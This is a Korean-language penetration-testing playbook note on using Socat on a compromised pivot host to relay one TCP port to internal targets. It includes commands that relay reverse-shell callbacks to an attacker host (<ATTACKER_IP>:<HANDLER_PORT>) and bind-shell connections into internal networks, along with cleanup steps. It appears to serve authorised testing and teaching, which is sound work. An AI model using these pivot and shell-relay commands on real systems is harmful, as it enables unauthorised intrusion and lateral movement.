---
tags:
  - 환경/linux
  - 환경/windows
시작조건: ["피벗 호스트 셸 확보", "공격 호스트와 내부 대상 사이에 단일 TCP 중계 필요"]
필요권한: ["피벗 호스트의 현재 계정으로 Socat 실행 및 <PIVOT_IP>:<LISTEN_PORT>/TCP 수신 가능"]
필요조건: ["피벗 호스트에서 중계 목적지 <DESTINATION_IP>:<DESTINATION_PORT>/TCP 연결 가능", "중계 시작점에서 <PIVOT_IP>:<LISTEN_PORT>/TCP 연결 가능"]
결과: ["<PIVOT_IP>:<LISTEN_PORT>에서 <DESTINATION_IP>:<DESTINATION_PORT>로의 단일 TCP 포트 중계"]
---

# Socat TCP 포트 중계

## 한 줄 판단

공격 호스트와 내부 대상이 직접 연결되지 않지만 셸을 보유한 `<PIVOT_IP>`가 양쪽 TCP 구간에 연결할 수 있으면, 피벗 호스트에서 Socat listener를 열어 한쪽 연결을 `<DESTINATION_IP>:<DESTINATION_PORT>`로 전달한다.

연결 시작점이 `<PIVOT_IP>:<LISTEN_PORT>`에 도달하고 피벗 호스트가 `<DESTINATION_IP>:<DESTINATION_PORT>`에 도달할 때, 셸을 보유한 피벗 호스트에서 실행한다. 이 문서는 SOCKS·대역 route가 아닌 단일 TCP 중계만 확인하며 payload·handler·셸 획득은 [[Reverse Shell 획득]] 또는 [[Bind Shell 획득]]에서 판단한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 시작 구간 | 연결 시작점에서 `<PIVOT_IP>:<LISTEN_PORT>` 접근 가능 | listener를 연 뒤 TCP 연결 확인 | 바인딩 주소, 방화벽과 포트 충돌 확인 |
| 목적지 구간 | 피벗 호스트에서 `<DESTINATION_IP>:<DESTINATION_PORT>` 접근 가능 | `nc -vz <DESTINATION_IP> <DESTINATION_PORT>` | 피벗 호스트의 route·DNS와 목적지 listener 확인 |
| 현재 권한 | Socat 실행과 수신 포트 바인딩 가능 | `ss -tulpen` 또는 `netstat -ano`로 포트 충돌 확인 | 실행 권한과 대체 포트 확인 |
| 필요한 정보 | 피벗 수신 주소·포트와 실제 목적지 주소·포트 | 각 호스트의 인터페이스 주소와 listener를 대조 | 잘못된 인터페이스·포트 수정 |

## 실행

### 피벗 호스트에서 단일 TCP 포트 중계

작업 전에 피벗 호스트에서 `<LISTEN_PORT>`의 기존 listener를 기록한다.

```bash
ss -ltnp | grep -E '[:.]<LISTEN_PORT>[[:space:]]'
```

```bash
socat TCP4-LISTEN:<LISTEN_PORT>,fork TCP4:<DESTINATION_IP>:<DESTINATION_PORT> &
SOCAT_PID=$!
ps -p "$SOCAT_PID" -o pid=,args=
```

확인할 출력:

- 피벗 호스트의 `<LISTEN_PORT>`가 수신 상태여야 한다.
- 시작점에서 피벗 listener로 연결했을 때 Socat이 목적지 연결을 생성해야 한다.
- Socat 연결 로그는 TCP 중계만 의미한다. 중계한 서비스의 인증, payload 실행 또는 셸 획득은 별도로 확인한다.

### Reverse Shell 콜백을 중계하는 경우

내부 대상의 콜백 목적지는 `<PIVOT_IP>:<LISTEN_PORT>`, Socat의 목적지는 공격 호스트의 listener `<ATTACKER_IP>:<HANDLER_PORT>`로 둔다.

```bash
socat TCP4-LISTEN:<LISTEN_PORT>,fork TCP4:<ATTACKER_IP>:<HANDLER_PORT> &
SOCAT_PID=$!
ps -p "$SOCAT_PID" -o pid=,args=
```

- payload와 listener 준비: [[Reverse Shell 획득]]
- 공격 호스트에서 실제 prompt와 `whoami`·`id`가 동작해야 셸 획득으로 판단한다.

### Bind Shell 접속을 중계하는 경우

공격 호스트는 `<PIVOT_IP>:<LISTEN_PORT>`로 연결하고, Socat은 내부 대상의 `<INTERNAL_IP>:<BIND_PORT>`로 전달한다.

```bash
socat TCP4-LISTEN:<LISTEN_PORT>,fork TCP4:<INTERNAL_IP>:<BIND_PORT> &
SOCAT_PID=$!
ps -p "$SOCAT_PID" -o pid=,args=
```

- 내부 대상 listener와 접속 절차: [[Bind Shell 획득]]
- 피벗 listener 연결, 내부 bind 포트 연결과 실제 명령 실행을 각각 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 피벗 호스트에서 목적지 포트 연결 성공 | 중계의 두 번째 구간이 유효함 | 목적지 TCP 기준선 확보 | Socat listener 시작 |
| Socat listener가 수신 중이고 시작점 연결 시 목적지 연결이 생성됨 | 단일 포트 중계가 동작함 | 피벗 경유 TCP 경로 | 중계한 서비스의 응답을 확인 |
| TCP 중계 뒤 reverse shell listener에 prompt가 도착함 | 중계와 대상 payload 실행이 모두 성공함 | 내부 대상의 셸 | 대상 플랫폼에 맞는 상태 라우터로 전환 |
| TCP 중계 뒤 bind shell 명령이 실행됨 | 중계와 내부 listener가 모두 동작함 | 내부 대상의 셸 | 대상 플랫폼에 맞는 상태 라우터로 전환 |
| Socat이 listen하지 못함 | 포트 충돌 또는 바인딩 권한 문제 | 중계 미생성 | 수신 주소·포트와 현재 권한 확인 |
| 피벗 listener에는 연결되지만 목적지 응답이 없음 | 목적지 주소·포트 또는 피벗의 route 문제 | 첫 구간만 연결 | 피벗 호스트에서 목적지 TCP를 다시 확인 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| 목적지 기준선 | 피벗 호스트에서 `nc -vz` 성공 | 목적지 포트 도달 가능 여부 확인 |
| 피벗 listener | Socat 수신 주소·포트와 연결 로그 | 현재 계정의 listener 실행 가능 여부 확인 |
| 중계 결과 | 목적 서비스 응답 | listener 생성과 실제 TCP 전달을 구분 |
| 셸 결과 | `whoami`, `id`, `getuid` | [[Reverse Shell 획득]] 또는 [[Bind Shell 획득]]에서 대상 계정과 권한 확인 |

## 변경 영향과 복구

이 절차가 새로 만드는 상태는 피벗 호스트의 `socat` 프로세스와 `<LISTEN_PORT>` listener다. 실행 직후 출력한 `$SOCAT_PID`, 전체 명령행, 실행 호스트와 포트를 작업 기록에 보관한다.

reverse·bind shell을 이 중계로 유지하고 있다면 먼저 하위 대상에서 필요한 정리를 끝내고 해당 shell을 닫는다. 그 뒤 피벗 호스트에서 기록한 PID의 명령행을 다시 확인하고 정확히 그 프로세스만 종료한다.

```bash
ps -p <SOCAT_PID> -o pid=,args=
ps --ppid <SOCAT_PID> -o pid=,ppid=,args=
ps -p <SOCAT_CHILD_PID> -o pid=,ppid=,args=
kill <SOCAT_CHILD_PID>
kill <SOCAT_PID>
ps -p <SOCAT_PID> -o pid=,args=
ss -ltnp | grep -E '[:.]<LISTEN_PORT>[[:space:]]'
```

`fork`가 만든 child가 표시되면 하위 연결을 닫은 뒤 사라졌는지 먼저 확인한다. 남은 child는 PPID와 전체 명령행이 기록한 listener에서 생성된 `<SOCAT_CHILD_PID>`와 일치할 때만 해당 PID를 종료한다. 두 번째 `ps` 출력이 비고 `<LISTEN_PORT>`에서 작업 전에는 없던 listener가 사라지면 이번 중계가 정리된 것이다. `kill` 뒤에도 남으면 PID가 재사용되지 않았는지 명령행을 다시 확인한 후 종료 신호를 판단한다. 연결이 이미 끊겼다면 하위 shell의 정리를 확인할 수 없으므로 완료로 기록하지 않고, 피벗에 다시 접근할 수 있을 때 `<SOCAT_PID>`와 listener만 별도로 확인한다. 이 문서는 파일 전송이나 영구 설정 변경을 수행하지 않으므로 이름 기반 프로세스 종료나 파일·방화벽 규칙 일괄 삭제를 하지 않는다.

## 관련 상태 라우터

- TCP 중계 뒤 셸을 얻었으면: [[Linux 셸 확보 후 초기 열거와 권한 상승]] 또는 [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- 중계 경로만 확보했으면: [[내부망 경로 확보 후 피벗 구성]]

## 관련 도구

- [[socat]]
- [[netcat]]

## 관련 노트

- [[Reverse Shell 획득]]
- [[Bind Shell 획득]]

## 참고 링크

- [Socat 공식 저장소](https://repo.or.cz/socat.git)
- [Socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
